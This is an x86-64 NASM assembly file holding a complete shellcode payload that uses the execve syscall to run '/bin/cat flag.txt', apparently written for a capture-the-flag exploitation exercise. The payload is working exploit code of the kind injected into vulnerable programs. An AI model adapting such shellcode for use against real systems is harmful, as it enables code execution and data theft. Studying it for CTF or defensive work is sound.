BITS 64
 
 %define SYS_EXECVE 59
 %define SYS_EXIT 60
 section .text
     global shellcode
 
     shellcode:
		
	xor rsi, rsi
	push rsi	
	mov r15, 0x7461632f6e69622f
	push r15
	push rsi
	mov r15, 0x7478742e67616c66
	push r15
	mov r14, rsp
	lea rdi,[rsp + 16]
	push rsi
	push r14
	push rdi
	mov rsi, rsp
	xor rax, rax
	mov al, SYS_EXECVE 
	xor rdx, rdx
        syscall

         

;filename = "/bin/cat"
;file = "flag.txt"
;args = {filename,file,NULL}
;execve(filename,args,NULL)
